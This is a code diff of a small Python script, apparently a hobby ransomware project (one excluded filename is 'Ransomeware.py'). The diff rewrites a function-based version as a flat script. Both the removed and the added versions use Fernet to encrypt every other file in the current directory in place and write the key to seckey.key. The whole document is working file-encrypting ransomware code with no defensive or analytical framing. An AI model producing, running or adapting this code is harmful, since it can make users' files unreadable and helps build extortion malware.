@@ -1,31 +1,26 @@
 import os
 from cryptography.fernet import Fernet
 
-def encrypt_files(directory="."):
-    """Encrypts all files in the given directory (excluding this script and key file)."""
-    files_to_encrypt = []
-    for filename in os.listdir(directory):
-        filepath = os.path.join(directory, filename)
-        if os.path.isfile(filepath) and filename != "encrypt.py" and filename != "seckey.key" and filename != "decrypt.py":
-            files_to_encrypt.append(filepath)
-    
-    print("Files to encrypt:", files_to_encrypt)
+files = []
 
-    key = Fernet.generate_key()
-    with open("seckey.key", "wb") as key_file:
-        key_file.write(key)
+# Collect files to encrypt
+for file in os.listdir():
+    if file == 'Ransomeware.py' or file == 'seckey.key' or file == 'decrypt.py':
+        continue
+    if os.path.isfile(file):
+        files.append(file)
 
-    for filepath in files_to_encrypt:
-        try:
-            with open(filepath, "rb") as file:
-                content = file.read()
-            fernet = Fernet(key)
-            encrypted_content = fernet.encrypt(content)
-            with open(filepath, "wb") as file:
-                file.write(encrypted_content)
-            print(f"Encrypted {filepath}")
-        except Exception as e:
-            print(f"Error encrypting {filepath}: {e}")
-    print("Encryption complete.")
+# Generate key and save it
+key = Fernet.generate_key()
+print(f"Encryption Key: {key}")
 
-encrypt_files()
+with open("seckey.key", "wb") as k:
+    k.write(key)
+
+# Encrypt each file
+for file in files:
+    with open(file, 'rb') as theFile:
+        content = theFile.read()
+    encrypted_content = Fernet(key).encrypt(content)
+    with open(file, 'wb') as theFile:
+        theFile.write(encrypted_content)
